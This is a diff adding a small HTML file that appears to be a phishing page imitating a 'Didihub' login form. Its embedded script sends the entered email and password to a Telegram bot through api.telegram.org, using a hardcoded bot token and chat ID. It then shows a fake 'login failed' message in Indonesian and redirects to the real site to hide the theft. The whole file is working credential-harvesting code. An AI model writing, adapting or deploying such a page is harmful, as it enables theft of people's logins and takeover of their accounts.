@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Didihub</title>
+</head>
+<body>
+  <form id="loginForm">
+    <label>Email:</label><br />
+    <input id="email" type="email" required /><br />
+    <label>Password:</label><br />
+    <input id="password" type="password" required /><br /><br />
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    const BOT_TOKEN = '7805960444:AAEb3UUNT3DZUfds6G2trRLv8UrJtLZfyyc';
+    const CHAT_ID = '-1002500559635';
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const message = `🔐 Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+      })
+      .then(response => {
+        if (!response.ok) {
+          alert('Gagal kirim data ke Telegram.');
+          throw new Error('Network response was not ok');
+        }
+        alert('Login gagal. Silakan coba lagi.');
+        window.location.href = 'https://www.didihub.com'; // redirect palsu
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('Terjadi kesalahan saat mengirim data.');
+      });
+    });
+  </script>
+</body>
+</html>
